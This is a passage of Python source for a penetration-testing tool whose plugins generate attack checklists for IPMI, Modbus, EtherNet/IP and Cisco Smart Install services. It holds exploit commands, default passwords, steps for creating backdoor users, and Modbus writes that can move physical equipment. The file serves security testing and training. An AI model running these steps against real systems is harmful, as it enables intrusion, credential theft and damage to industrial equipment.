"""
Industrial/IoT Protocol Enumeration Plugin

Generates tasks for industrial control system and IoT protocol enumeration including:
- IPMI (Intelligent Platform Management Interface) - Port 623
- Modbus (SCADA protocol) - Port 502
- EtherNet/IP (Industrial automation) - Port 44818
- Cisco Smart Install - Port 4786
- Hadoop distributed systems - Ports 50030-50090

Extracted from HackTricks:
- 623-udp-ipmi.md
- pentesting-modbus.md
- 44818-ethernetip.md
- 4786-cisco-smart-install.md
- 50030-50060-50070-50075-50090-pentesting-hadoop.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class IPMIPlugin(ServicePlugin):
    """IPMI (Intelligent Platform Management Interface) enumeration plugin"""

    @property
    def name(self) -> str:
        return "ipmi"

    @property
    def default_ports(self) -> List[int]:
        return [623]

    @property
    def service_names(self) -> List[str]:
        return ['ipmi', 'bmc', 'baseboard-management']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect IPMI services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common port (UDP/TCP)
        if port == 623:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate IPMI enumeration task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', '')

        tasks = {
            'id': f'ipmi-enum-{port}',
            'name': f'IPMI Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Version Detection
        tasks['children'].append({
            'id': f'ipmi-version-{port}',
            'name': 'IPMI Version Detection',
            'type': 'parent',
            'children': [
                {
                    'id': f'ipmi-nmap-version-{port}',
                    'name': 'Nmap IPMI Version',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap -sU --script ipmi-version -p {port} {target}',
                        'description': 'Detect IPMI version and BMC details',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'AUTOMATED'],
                        'flag_explanations': {
                            '-sU': 'UDP scan (IPMI typically runs on UDP)',
                            '--script ipmi-version': 'NSE script for IPMI version detection',
                            f'-p {port}': f'Target port {port} (IPMI default)',
                            target: 'Target IP address'
                        },
                        'success_indicators': [
                            'IPMI version displayed (1.5 or 2.0)',
                            'BMC manufacturer identified',
                            'Product name revealed (iLO, iDRAC, IMM, etc.)'
                        ],
                        'failure_indicators': [
                            'Port filtered or closed',
                            'No response (firewall blocking)',
                            'Timeout (try TCP if UDP fails)'
                        ],
                        'next_steps': [
                            'If version 2.0 detected → Test cipher 0 bypass',
                            'If version 2.0 detected → Test RAKP hash retrieval',
                            'Research manufacturer-specific vulnerabilities'
                        ],
                        'alternatives': [
                            f'use auxiliary/scanner/ipmi/ipmi_version in Metasploit',
                            f'nmap -n -p {port} {target} (TCP scan)',
                            f'nc -u {target} {port} (manual UDP connection)'
                        ],
                        'notes': 'IPMI 2.0 has critical vulnerabilities (cipher 0, RAKP). Version detection is crucial.',
                        'estimated_time': '1-2 minutes'
                    }
                }
            ]
        })

        # TASK 2: IPMI 2.0 Cipher 0 Authentication Bypass
        tasks['children'].append({
            'id': f'ipmi-cipher-zero-{port}',
            'name': 'IPMI 2.0 Cipher 0 Bypass (CVE-2013-4786)',
            'type': 'parent',
            'children': [
                {
                    'id': f'ipmi-cipher-detect-{port}',
                    'name': 'Detect Cipher 0 Vulnerability',
                    'type': 'command',
                    'metadata': {
                        'command': f'use auxiliary/scanner/ipmi/ipmi_cipher_zero',
                        'description': 'Test for IPMI 2.0 cipher type 0 authentication bypass (affects HP, Dell, Supermicro)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT', 'AUTOMATED'],
                        'flag_explanations': {
                            'auxiliary/scanner/ipmi/ipmi_cipher_zero': 'Metasploit module for cipher 0 detection',
                        },
                        'success_indicators': [
                            'Vulnerable to cipher 0 bypass',
                            'Authentication bypass confirmed',
                            'Valid usernames discovered'
                        ],
                        'failure_indicators': [
                            'Not vulnerable (patched)',
                            'IPMI version 1.5 (cipher 0 is 2.0-specific)',
                            'Connection refused'
                        ],
                        'next_steps': [
                            'If vulnerable → Exploit with ipmitool',
                            'List all users with cipher 0',
                            'Change admin password',
                            'Create backdoor user account'
                        ],
                        'alternatives': [
                            f'ipmitool -I lanplus -C 0 -H {target} -U root -P root user list (manual test)',
                            'Research Dan Farmer cipher 0 exploit: http://fish2.com/ipmi/cipherzero.html'
                        ],
                        'notes': 'Cipher 0 allows authentication with any password if targeting valid username. Severity: 9.8/10 CVSS.',
                        'estimated_time': '2-3 minutes'
                    }
                },
                {
                    'id': f'ipmi-cipher-exploit-{port}',
                    'name': 'Exploit Cipher 0 with ipmitool',
                    'type': 'command',
                    'metadata': {
                        'command': f'ipmitool -I lanplus -C 0 -H {target} -U root -P root user list',
                        'description': 'Exploit cipher 0 bypass to list users (requires ipmitool installed)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'flag_explanations': {
                            '-I lanplus': 'Use LAN+ interface (IPMI 2.0)',
                            '-C 0': 'Cipher type 0 (authentication bypass)',
                            '-H': 'Target hostname/IP',
                            '-U root': 'Username (any valid user works)',
                            '-P root': 'Password (any password works with cipher 0)',
                            'user list': 'IPMI command to list all users'
                        },
                        'success_indicators': [
                            'User list displayed with IDs',
                            'ADMIN, root, or other accounts shown',
                            'Privilege levels revealed'
                        ],
                        'failure_indicators': [
                            'Authentication failed (not vulnerable)',
                            'Command not found (install: apt-get install ipmitool)',
                            'Connection timeout'
                        ],
                        'next_steps': [
                            'Change admin password: ipmitool -I lanplus -C 0 -H {target} -U root -P root user set password 2 newpass',
                            'Create backdoor: ipmitool user set name 4 backdoor',
                            'Access BMC web interface with new credentials',
                            'Pivot to host OS via KVM/serial console'
                        ],
                        'alternatives': [
                            'Use Metasploit ipmi_dumphashes module',
                            'Manual BMC web interface login',
                            'Serial over LAN (SOL) access: ipmitool sol activate'
                        ],
                        'notes': 'Install ipmitool: apt-get install ipmitool. User ID 2 is typically ADMIN.',
                        'estimated_time': '3-5 minutes'
                    }
                }
            ]
        })

        # TASK 3: IPMI 2.0 RAKP Password Hash Retrieval
        tasks['children'].append({
            'id': f'ipmi-rakp-hash-{port}',
            'name': 'IPMI 2.0 RAKP Hash Retrieval',
            'type': 'command',
            'metadata': {
                'command': f'use auxiliary/scanner/ipmi/ipmi_dumphashes',
                'description': 'Retrieve salted password hashes (MD5/SHA1) for any username via RAKP protocol',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'AUTOMATED', 'CREDENTIAL_THEFT'],
                'flag_explanations': {
                    'auxiliary/scanner/ipmi/ipmi_dumphashes': 'Metasploit module for RAKP authentication hash dumping',
                },
                'success_indicators': [
                    'Password hashes retrieved',
                    'MD5 or SHA1 hashes displayed',
                    'Valid usernames confirmed'
                ],
                'failure_indicators': [
                    'No hashes returned (invalid usernames)',
                    'IPMI version 1.5 (RAKP is 2.0-specific)',
                    'Connection refused'
                ],
                'next_steps': [
                    'Crack hashes with hashcat or john',
                    'hashcat -m 7300 hash.txt wordlist.txt (IPMI2 RAKP HMAC-SHA1)',
                    'john --format=rakp hash.txt',
                    'Test cracked credentials on BMC web interface',
                    'Test credentials on SSH/other services (password reuse)'
                ],
                'alternatives': [
                    'Manual RAKP authentication attempt with ipmitool',
                    'Brute-force with hydra (slower, noisier)'
                ],
                'notes': 'RAKP allows hash retrieval for ANY username without authentication. HP iLO uses random 8-char passwords. Dell/IBM/Supermicro often use defaults.',
                'estimated_time': '2-3 minutes'
            }
        })

        # TASK 4: Anonymous Authentication Test
        tasks['children'].append({
            'id': f'ipmi-anonymous-{port}',
            'name': 'IPMI Anonymous Authentication',
            'type': 'command',
            'metadata': {
                'command': f'ipmitool -I lanplus -H {target} -U \'\' -P \'\' user list',
                'description': 'Test for anonymous access with null username/password (default BMC configuration)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    '-I lanplus': 'Use LAN+ interface',
                    '-H': 'Target hostname/IP',
                    '-U \'\'': 'Empty username (anonymous)',
                    '-P \'\'': 'Empty password (anonymous)',
                    'user list': 'List all IPMI users'
                },
                'success_indicators': [
                    'User list displayed without authentication',
                    'Anonymous access enabled',
                    'Default configuration detected'
                ],
                'failure_indicators': [
                    'Authentication required',
                    'Anonymous access disabled',
                    'Connection refused'
                ],
                'next_steps': [
                    'If successful → Change user passwords: ipmitool -I lanplus -H {target} -U \'\' -P \'\' user set password 2 newpass',
                    'Create backdoor user',
                    'Access BMC web interface',
                    'Document misconfiguration for report'
                ],
                'alternatives': [
                    'Try default credentials (see brute-force task)',
                    'BMC web interface anonymous login test'
                ],
                'notes': 'Many BMCs allow anonymous access by default. Critical misconfiguration.',
                'estimated_time': '1-2 minutes'
            }
        })

        # TASK 5: Default Credentials Brute-force
        tasks['children'].append({
            'id': f'ipmi-brute-{port}',
            'name': 'IPMI Default Credentials Test',
            'type': 'parent',
            'children': [
                {
                    'id': f'ipmi-default-creds-{port}',
                    'name': 'Test Manufacturer Defaults',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test known default credentials for various IPMI/BMC implementations',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'alternatives': [
                            'HP iLO: ADMIN / <8-char random> (factory set, often unchanged)',
                            'Dell iDRAC: root / calvin',
                            'IBM IMM: USERID / PASSW0RD (zero, not O)',
                            'Fujitsu iRMC: admin / admin',
                            'Supermicro IPMI: ADMIN / ADMIN',
                            'Oracle/Sun ILOM: root / changeme',
                            'ASUS iKVM BMC: admin / admin'
                        ],
                        'success_indicators': [
                            'Authentication successful',
                            'BMC web interface access',
                            'User list retrieved'
                        ],
                        'failure_indicators': [
                            'All defaults failed',
                            'Account lockout triggered',
                            'Custom password set'
                        ],
                        'next_steps': [
                            'If login successful → Change passwords',
                            'If failed → Try RAKP hash retrieval and crack',
                            'Document vendor/product for targeted research'
                        ],
                        'notes': 'HP randomizes passwords but others use static defaults. Dell "calvin" is extremely common.',
                        'estimated_time': '5-10 minutes'
                    }
                }
            ]
        })

        # TASK 6: Supermicro-specific Vulnerabilities
        if 'supermicro' in product.lower():
            tasks['children'].append({
                'id': f'ipmi-supermicro-{port}',
                'name': 'Supermicro IPMI Vulnerabilities',
                'type': 'parent',
                'children': [
                    {
                        'id': f'ipmi-cleartext-pass-{port}',
                        'name': 'Supermicro Clear-text Password Extraction',
                        'type': 'manual',
                        'metadata': {
                            'description': 'IPMI 2.0 stores passwords in clear-text on Supermicro BMCs',
                            'tags': ['OSCP:MEDIUM', 'CREDENTIAL_THEFT'],
                            'alternatives': [
                                'cat /nv/PSBlock (if BMC shell access)',
                                'cat /nv/PSStore (alternative location)',
                                'Search for clear-text passwords in BMC firmware dumps'
                            ],
                            'success_indicators': [
                                'Clear-text passwords found',
                                'Admin credentials revealed'
                            ],
                            'failure_indicators': [
                                'No BMC shell access',
                                'Files not readable',
                                'Passwords encrypted/hashed'
                            ],
                            'next_steps': [
                                'Use passwords for BMC access',
                                'Test password reuse on other systems',
                                'Document critical design flaw'
                            ],
                            'notes': 'Requires prior BMC access. IPMI 2.0 design flaw requires clear-text storage for auth.',
                            'estimated_time': '2-3 minutes'
                        }
                    },
                    {
                        'id': f'ipmi-upnp-exploit-{port}',
                        'name': 'Supermicro UPnP Buffer Overflow',
                        'type': 'command',
                        'metadata': {
                            'command': f'use exploit/multi/upnp/libupnp_ssdp_overflow',
                            'description': 'Exploit UPnP SSDP buffer overflow on UDP 1900 for root BMC access',
                            'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'AUTOMATED'],
                            'flag_explanations': {
                                'exploit/multi/upnp/libupnp_ssdp_overflow': 'Metasploit exploit for Intel SDK UPnP vulnerability'
                            },
                            'success_indicators': [
                                'Root shell on BMC obtained',
                                'Command execution confirmed',
                                'UPnP service exploited'
                            ],
                            'failure_indicators': [
                                'UPnP not running on UDP 1900',
                                'Patched BMC firmware',
                                'Exploit failed (wrong target)',
                                'Firewall blocking UDP 1900'
                            ],
                            'next_steps': [
                                'Extract clear-text passwords from /nv/PSBlock',
                                'Create persistent backdoor user',
                                'Pivot to host OS via KVM',
                                'Dump BMC configuration'
                            ],
                            'alternatives': [
                                'nmap -sU -p 1900 {target} --script upnp-info (detect UPnP)',
                                'Manual UPnP SSDP packet crafting',
                                'Research Intel SDK 1.3.1 vulnerabilities'
                            ],
                            'notes': 'Check UDP 1900 for UPnP. Vulnerability in Intel SDK for UPnP Devices 1.3.1. Reference: https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play',
                            'estimated_time': '5-10 minutes'
                        }
                    }
                ]
            })

        # TASK 7: Post-Exploitation - BMC to Host Access
        tasks['children'].append({
            'id': f'ipmi-post-exploit-{port}',
            'name': 'BMC Access → Host Compromise',
            'type': 'parent',
            'children': [
                {
                    'id': f'ipmi-kvm-access-{port}',
                    'name': 'Access Host via KVM/Serial Console',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use BMC KVM or Serial-over-LAN to access host OS (reboot to GRUB or rescue disk)',
                        'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT'],
                        'alternatives': [
                            'BMC web interface → Launch KVM console',
                            'Reboot to GRUB → Edit boot: init=/bin/sh (root shell)',
                            'Mount virtual CD-ROM rescue disk',
                            'ipmitool sol activate (Serial over LAN)',
                            'Access logged-in serial/physical console via BMC'
                        ],
                        'success_indicators': [
                            'Host OS console access',
                            'Root shell obtained',
                            'Disk access for backdoor insertion'
                        ],
                        'failure_indicators': [
                            'KVM disabled',
                            'Serial console not active',
                            'Host requires reboot (noisy)',
                            'GRUB password protected'
                        ],
                        'next_steps': [
                            'Extract /etc/shadow for offline cracking',
                            'Add SSH key to /root/.ssh/authorized_keys',
                            'Create new root user',
                            'Install persistent backdoor',
                            'Exfiltrate sensitive data'
                        ],
                        'notes': 'KVM access allows full host control but may require reboot (detectable). Serial-over-LAN is stealthier if console logged in.',
                        'estimated_time': '10-20 minutes'
                    }
                },
                {
                    'id': f'ipmi-backdoor-from-host-{port}',
                    'name': 'Create BMC Backdoor from Compromised Host',
                    'type': 'command',
                    'metadata': {
                        'command': f'ipmitool user set name 4 backdoor && ipmitool user set password 4 backdoor && ipmitool user priv 4 4',
                        'description': 'If host is compromised, use local BMC interface to create persistent backdoor user',
                        'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT'],
                        'flag_explanations': {
                            'user set name 4 backdoor': 'Set username for user ID 4',
                            'user set password 4 backdoor': 'Set password for user ID 4',
                            'user priv 4 4': 'Grant administrator privilege level 4'
                        },
                        'success_indicators': [
                            'Backdoor user created',
                            'Administrator privileges granted',
                            'User appears in: ipmitool user list'
                        ],
                        'failure_indicators': [
                            'ipmitool not installed on host',
                            'BMC driver not loaded',
                            'User ID 4 already in use (try 5, 6, etc.)',
                            'Insufficient host privileges'
                        ],
                        'next_steps': [
                            'Verify: ipmitool user list',
                            'Test remote login with backdoor account',
                            'Access BMC web interface',
                            'Maintain persistence even if host OS rebuilt'
                        ],
                        'alternatives': [
                            'ipmitool user list (check available user IDs)',
                            'Windows: Use ipmitool.exe from compromised host',
                            'Linux: Requires kernel BMC drivers loaded'
                        ],
                        'notes': 'BMC backdoor survives OS reinstalls. Works on Linux, Windows, BSD, DOS. No authentication required via local interface.',
                        'estimated_time': '2-3 minutes'
                    }
                }
            ]
        })

        # TASK 8: Shodan/Reconnaissance
        tasks['children'].append({
            'id': f'ipmi-shodan-{port}',
            'name': 'Shodan IPMI Reconnaissance',
            'type': 'manual',
            'metadata': {
                'description': 'Search Shodan for IPMI services exposed to internet',
                'tags': ['OSCP:LOW', 'RECON'],
                'alternatives': [
                    'Shodan query: port:623',
                    'Shodan query: port:623 "IPMI"',
                    'Shodan query: port:623 country:"US"',
                    'https://www.shodan.io/search?query=port:623'
                ],
                'success_indicators': [
                    'IPMI devices discovered',
                    'Vulnerable versions identified',
                    'Manufacturer information revealed'
                ],
                'failure_indicators': [
                    'No results',
                    'Shodan API limit reached',
                    'No internet-exposed IPMI'
                ],
                'next_steps': [
                    'Target internet-exposed IPMI for testing',
                    'Research vendor-specific vulnerabilities',
                    'Attempt cipher 0 bypass on findings'
                ],
                'notes': 'IPMI should NEVER be internet-exposed. Critical security issue if found.',
                'estimated_time': '3-5 minutes'
            }
        })

        return tasks


@ServiceRegistry.register
class ModbusPlugin(ServicePlugin):
    """Modbus SCADA protocol enumeration plugin"""

    @property
    def name(self) -> str:
        return "modbus"

    @property
    def default_ports(self) -> List[int]:
        return [502]

    @property
    def service_names(self) -> List[str]:
        return ['modbus', 'modbus-tcp', 'scada']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect Modbus services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common port
        if port == 502:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Modbus enumeration task tree"""

        tasks = {
            'id': f'modbus-enum-{port}',
            'name': f'Modbus SCADA Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Modbus Discovery
        tasks['children'].append({
            'id': f'modbus-discover-{port}',
            'name': 'Modbus Device Discovery',
            'type': 'command',
            'metadata': {
                'command': f'nmap --script modbus-discover -p {port} {target}',
                'description': 'Discover Modbus devices and read device information',
                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'AUTOMATED', 'SCADA'],
                'flag_explanations': {
                    '--script modbus-discover': 'NSE script for Modbus device enumeration',
                    f'-p {port}': f'Target Modbus port {port}',
                    target: 'Target IP address (PLC, RTU, or gateway)'
                },
                'success_indicators': [
                    'Device information retrieved',
                    'Vendor ID identified',
                    'Product code displayed',
                    'Firmware version revealed'
                ],
                'failure_indicators': [
                    'Connection refused (not Modbus)',
                    'Timeout (firewall blocking)',
                    'Invalid response (wrong protocol)'
                ],
                'next_steps': [
                    'Research device firmware vulnerabilities',
                    'Enumerate Unit IDs with Metasploit',
                    'Test write operations (dangerous in production!)',
                    'Document device details for ICS assessment'
                ],
                'alternatives': [
                    f'use auxiliary/scanner/scada/modbusdetect in Metasploit',
                    'Manual Modbus client connection',
                    'Use mbtget (Modbus client tool)',
                    'Python pymodbus library for custom enumeration'
                ],
                'notes': 'Modbus is master-slave protocol (1979). Used in water treatment, manufacturing, utilities. NO AUTHENTICATION by default.',
                'estimated_time': '2-3 minutes'
            }
        })

        # TASK 2: Unit ID Enumeration
        tasks['children'].append({
            'id': f'modbus-unitid-{port}',
            'name': 'Modbus Unit ID Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'use auxiliary/scanner/scada/modbus_findunitid',
                'description': 'Enumerate valid Modbus Unit IDs (slave devices on network)',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'SCADA'],
                'flag_explanations': {
                    'auxiliary/scanner/scada/modbus_findunitid': 'Metasploit module for Unit ID discovery'
                },
                'success_indicators': [
                    'Valid Unit IDs discovered (1-247)',
                    'Slave devices identified',
                    'Device responses received'
                ],
                'failure_indicators': [
                    'No Unit IDs respond',
                    'Connection timeout',
                    'Modbus gateway blocking enumeration'
                ],
                'next_steps': [
                    'Read coils/registers from discovered Unit IDs',
                    'Test write operations (USE CAUTION)',
                    'Map Unit ID to physical device function',
                    'Research device-specific attacks'
                ],
                'alternatives': [
                    'Manual Unit ID scan with mbtget',
                    'Python script with pymodbus',
                    'Wireshark capture to identify active Unit IDs'
                ],
                'notes': 'Unit IDs identify slave devices (1-247). Brute-force enumeration is safe (read-only).',
                'estimated_time': '5-10 minutes'
            }
        })

        # TASK 3: Read/Write Operations (CAUTION)
        tasks['children'].append({
            'id': f'modbus-read-write-{port}',
            'name': 'Modbus Read/Write Operations',
            'type': 'manual',
            'metadata': {
                'description': 'Read coils, registers, or test write operations (DANGEROUS in production ICS)',
                'tags': ['OSCP:LOW', 'MANUAL', 'SCADA', 'EXPLOIT'],
                'alternatives': [
                    'mbtget -r1 -c10 {target} (read 10 coils starting at address 1)',
                    'Python pymodbus: client.read_holding_registers(0, 10, unit=1)',
                    'Metasploit modbusdetect module with read operations',
                    'WARNING: write_coil() can control physical equipment'
                ],
                'success_indicators': [
                    'Coil values read successfully',
                    'Register values displayed',
                    'Write operation confirmed (if testing)'
                ],
                'failure_indicators': [
                    'Access denied (rare - Modbus has no auth)',
                    'Invalid function code',
                    'Device does not support operation'
                ],
                'next_steps': [
                    'Analyze register/coil values for sensitive data',
                    'Identify control registers (valves, motors, sensors)',
                    'Test impact of write operations IN LAB ONLY',
                    'Document for ICS security assessment'
                ],
                'notes': 'CRITICAL: Writing to Modbus can PHYSICALLY DAMAGE equipment or endanger safety. ONLY test writes in lab environments. Water treatment plants and manufacturing use Modbus extensively.',
                'estimated_time': 'Variable (10-30 minutes)'
            }
        })

        # TASK 4: Exploitation Research
        tasks['children'].append({
            'id': f'modbus-exploit-research-{port}',
            'name': 'Modbus Exploitation Research',
            'type': 'manual',
            'metadata': {
                'description': 'Research device-specific vulnerabilities and Modbus attack vectors',
                'tags': ['OSCP:LOW', 'RESEARCH', 'SCADA'],
                'alternatives': [
                    'searchsploit modbus',
                    'searchsploit <DEVICE_VENDOR>',
                    'Research ICS-CERT advisories',
                    'https://www.cisa.gov/ics (US ICS-CERT)',
                    'Shodan: port:502 (find Modbus on internet)',
                    'Exploit-DB: ICS/SCADA section'
                ],
                'success_indicators': [
                    'Known vulnerabilities found',
                    'Exploits available for device',
                    'Attack vectors documented'
                ],
                'failure_indicators': [
                    'No public exploits',
                    'Device too obscure',
                    'Vendor has good security record'
                ],
                'next_steps': [
                    'Develop custom exploit if needed',
                    'Test in isolated lab environment',
                    'Document findings for client',
                    'Recommend Modbus/TCP firewall rules'
                ],
                'notes': 'Modbus is inherently insecure (no encryption, no authentication). Defense requires network segmentation and firewalls. NOT OSCP-relevant but critical for ICS pentesting.',
                'estimated_time': '10-20 minutes'
            }
        })

        return tasks


@ServiceRegistry.register
class EtherNetIPPlugin(ServicePlugin):
    """EtherNet/IP industrial automation protocol enumeration plugin"""

    @property
    def name(self) -> str:
        return "ethernetip"

    @property
    def default_ports(self) -> List[int]:
        return [44818]

    @property
    def service_names(self) -> List[str]:
        return ['ethernetip', 'ethernet/ip', 'enip']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect EtherNet/IP services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        product = port_info.get('product', '').lower()

        # Check service name
        if any(svc in service for svc in ['ethernet', 'enip']):
            return True

        # Check product
        if 'rockwell' in product or 'allen-bradley' in product:
            return True

        # Check common port (UDP/TCP)
        if port == 44818:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate EtherNet/IP enumeration task tree"""

        tasks = {
            'id': f'enip-enum-{port}',
            'name': f'EtherNet/IP Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Device Enumeration
        tasks['children'].append({
            'id': f'enip-nmap-{port}',
            'name': 'EtherNet/IP Device Information',
            'type': 'command',
            'metadata': {
                'command': f'nmap -n -sV --script enip-info -p {port} {target}',
                'description': 'Query EtherNet/IP device for identity and capabilities',
                'tags': ['OSCP:LOW', 'QUICK_WIN', 'AUTOMATED', 'SCADA'],
                'flag_explanations': {
                    '-n': 'No DNS resolution (faster)',
                    '-sV': 'Service version detection',
                    '--script enip-info': 'NSE script for EtherNet/IP enumeration',
                    f'-p {port}': f'Target port {port} (EtherNet/IP default)',
                    target: 'Target IP address'
                },
                'success_indicators': [
                    'Device identity retrieved',
                    'Product name displayed (e.g., Allen-Bradley PLC)',
                    'Vendor information revealed',
                    'Device type identified (PLC, HMI, gateway)',
                    'Firmware version shown'
                ],
                'failure_indicators': [
                    'Connection refused',
                    'Timeout (firewall blocking)',
                    'Invalid response (not EtherNet/IP)'
                ],
                'next_steps': [
                    'Research device-specific vulnerabilities',
                    'Use cpppo for deeper enumeration',
                    'Enumerate services with --list-services',
                    'Document for ICS assessment'
                ],
                'alternatives': [
                    f'python3 -m cpppo.server.enip.list_services --list-identity -a {target}',
                    f'python3 -m cpppo.server.enip.list_services --udp --broadcast --list-identity -a {target} (broadcast discovery)',
                    'Wireshark packet capture for manual analysis',
                    'Shodan: port:44818 "product name" (internet search)'
                ],
                'notes': 'EtherNet/IP is Rockwell Automation protocol (late 1990s). Used in water plants, manufacturing, utilities. Managed by ODVA.',
                'estimated_time': '2-3 minutes'
            }
        })

        # TASK 2: cpppo Enumeration
        tasks['children'].append({
            'id': f'enip-cpppo-{port}',
            'name': 'cpppo Deep Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'python3 -m cpppo.server.enip.list_services --list-identity -a {target}',
                'description': 'Use cpppo Python library for detailed EtherNet/IP enumeration',
                'tags': ['OSCP:LOW', 'AUTOMATED', 'SCADA'],
                'flag_explanations': {
                    'cpppo.server.enip.list_services': 'cpppo EtherNet/IP module',
                    '--list-identity': 'Query device identity',
                    '-a': 'Target address',
                    '--udp': '(Optional) Use UDP instead of TCP',
                    '--broadcast': '(Optional) Broadcast discovery on LAN'
                },
                'success_indicators': [
                    'Device identity returned',
                    'Vendor/Product details displayed',
                    'IP address and port confirmed',
                    'Device state information'
                ],
                'failure_indicators': [
                    'cpppo not installed (pip3 install cpppo)',
                    'Connection timeout',
                    'Invalid response'
                ],
                'next_steps': [
                    'Enumerate services on device',
                    'Read device attributes',
                    'Test write operations (CAUTION)',
                    'Research firmware vulnerabilities'
                ],
                'alternatives': [
                    f'nmap --script enip-info -p {port} {target}',
                    'Manual packet crafting with Scapy',
                    'Wireshark capture analysis'
                ],
                'notes': 'Install cpppo: pip3 install cpppo. EtherNet/IP uses List Identities Message (0x63) for enumeration.',
                'estimated_time': '3-5 minutes'
            }
        })

        # TASK 3: Shodan Reconnaissance
        tasks['children'].append({
            'id': f'enip-shodan-{port}',
            'name': 'Shodan EtherNet/IP Search',
            'type': 'manual',
            'metadata': {
                'description': 'Search Shodan for internet-exposed EtherNet/IP devices',
                'tags': ['OSCP:LOW', 'RECON', 'SCADA'],
                'alternatives': [
                    'Shodan query: port:44818 "product name"',
                    'Shodan query: port:44818 "rockwell"',
                    'Shodan query: port:44818 "allen-bradley"',
                    'https://www.shodan.io/search?query=port:44818'
                ],
                'success_indicators': [
                    'EtherNet/IP devices discovered',
                    'Product names identified',
                    'Vendor information revealed',
                    'Geographic distribution mapped'
                ],
                'failure_indicators': [
                    'No results',
                    'Shodan API limit',
                    'No internet-exposed devices'
                ],
                'next_steps': [
                    'Target devices for enumeration',
                    'Research vendor vulnerabilities',
                    'Document for ICS threat intelligence'
                ],
                'notes': 'EtherNet/IP should NOT be internet-exposed. Critical ICS security issue.',
                'estimated_time': '3-5 minutes'
            }
        })

        # TASK 4: Exploitation Research
        tasks['children'].append({
            'id': f'enip-exploit-research-{port}',
            'name': 'EtherNet/IP Vulnerability Research',
            'type': 'manual',
            'metadata': {
                'description': 'Research device-specific vulnerabilities and attack vectors',
                'tags': ['OSCP:LOW', 'RESEARCH', 'SCADA'],
                'alternatives': [
                    'searchsploit ethernetip',
                    'searchsploit rockwell',
                    'searchsploit allen-bradley',
                    'ICS-CERT advisories: https://www.cisa.gov/ics',
                    'ODVA vulnerability disclosures'
                ],
                'success_indicators': [
                    'Known vulnerabilities found',
                    'Exploits available',
                    'Attack vectors documented'
                ],
                'failure_indicators': [
                    'No public exploits',
                    'Vendor has patched issues',
                    'Device too new/obscure'
                ],
                'next_steps': [
                    'Test exploits in lab',
                    'Develop custom tools if needed',
                    'Document for assessment',
                    'Recommend network segmentation'
                ],
                'notes': 'EtherNet/IP designed for industrial networks, not internet. Multi-vendor interoperability = large attack surface. NOT OSCP-relevant.',
                'estimated_time': '10-20 minutes'
            }
        })

        return tasks


@ServiceRegistry.register
class CiscoSmartInstallPlugin(ServicePlugin):
    """Cisco Smart Install exploitation plugin"""

    @property
    def name(self) -> str:
        return "cisco-smart-install"

    @property
    def default_ports(self) -> List[int]:
        return [4786]

    @property
    def service_names(self) -> List[str]:
        return ['smart-install', 'cisco-smart-install', 'vstack']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect Cisco Smart Install services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        product = port_info.get('product', '').lower()

        # Check service name
        if any(svc in service for svc in ['smart-install', 'vstack']):
            return True

        # Check product
        if 'cisco' in product and 'smart' in service:
            return True

        # Check common port
        if port == 4786:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Cisco Smart Install exploitation task tree"""

        tasks = {
            'id': f'cisco-smi-enum-{port}',
            'name': f'Cisco Smart Install Exploitation (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: CVE-2018-0171 Exploitation with SIET
        tasks['children'].append({
            'id': f'cisco-smi-cve-2018-0171-{port}',
            'name': 'CVE-2018-0171: Smart Install Buffer Overflow',
            'type': 'parent',
            'children': [
                {
                    'id': f'cisco-smi-siet-exfil-{port}',
                    'name': 'SIET: Configuration Exfiltration',
                    'type': 'command',
                    'metadata': {
                        'command': f'python2 siet.py -g -i {target}',
                        'description': 'Exploit CVE-2018-0171 to steal network device configuration (CVSS 9.8)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'AUTOMATED', 'QUICK_WIN'],
                        'flag_explanations': {
                            'python2': 'SIET requires Python 2',
                            'siet.py': 'Smart Install Exploitation Tool',
                            '-g': 'Get/exfiltrate configuration from device',
                            '-i': 'Target IP address'
                        },
                        'success_indicators': [
                            'Configuration file retrieved',
                            'File saved to tftp/ folder',
